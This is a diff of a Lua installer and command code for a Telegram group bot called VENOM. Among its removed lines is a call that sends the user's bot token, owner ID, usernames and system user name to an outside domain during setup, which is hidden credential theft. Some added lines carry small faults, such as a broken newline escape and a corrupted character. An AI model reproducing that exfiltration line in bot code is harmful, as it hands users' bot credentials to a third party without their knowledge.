@@ -29,8 +29,6 @@ if res ~= 200 then
 print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
-local json = JSON.decode(url)
-database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
 end 
 else
@@ -45,14 +43,16 @@ if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
-
+os.execute('lua VENOM.lua')
+end
+if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
-database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -60,7 +60,6 @@ os.execute('lua VENOM.lua')
 end
 local create_config_auto = function()
 config = {
-botUserName = database:get(id_server..":token_username"),
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
@@ -68,12 +67,9 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-botUserName = database:get(id_server..":token_username")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://devloprahmedVNO.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("VENOM", "w")  
 file:write([[
@@ -83,15 +79,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
+echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
+echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺▷"
 exit 1
 fi
 if [ ! $token ]; then
-echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Info.lua \e[0m"
-echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
+echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
+echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -13873,7 +13869,7 @@ local function getpro(extra, result, success)
 local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
 local rdbhoto = nspp[math.random(#nspp)]
 if result.photos_[0] then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي ٪"..rdbhoto.."🙄♥" )
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي % "..rdbhoto.." 🙄♥" )
 else
 send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
   end end
@@ -14035,7 +14031,7 @@ local bana = {
 	
 "⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★",
 
-"• 🖤 |𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑| 🖤 •",
+"• 🖤 |𝑾𝒆𝒍𝒄??𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑| 🖤 •",
 
 }
 local rdphoto = bana[math.random(#bana)]
